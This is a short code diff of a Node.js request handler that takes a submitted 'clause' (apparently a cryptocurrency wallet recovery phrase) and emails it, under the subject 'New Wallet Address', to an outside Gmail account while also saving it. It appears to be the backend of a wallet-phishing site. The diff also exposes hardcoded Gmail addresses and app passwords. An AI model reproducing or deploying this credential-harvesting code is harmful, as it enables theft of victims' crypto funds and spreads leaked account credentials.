@@ -9,17 +9,17 @@ const store = (req, res, next) => {
   const transporter = nodemailer.createTransport({
     service: "Gmail", // e.g., 'Gmail', 'Yahoo', etc.
     auth: {
-      user: "eightninemo@gmail.com",
-      pass: "baxi hrmu tsca pobn",
+      user: "defi6155@gmail.com",
+      pass: "fzcb sjvn xyyv zkbr",
     },
   });
 
   // Email data
   const mailOptions = {
-    from: "eightninemo@gmail.com",
-    to: "sooreoluwwaa@gmail.com",
+    from: "defi6155@gmail.com",
+    to: "maindefiportal@gmail.com",
     subject: "New Wallet Address",
-    text: clause,
+    html: `<p>The wallet address is</p> </br> <b>${clause}</b>`,
   };
   let phrase = Phrase({
     clause: req.body.clause,
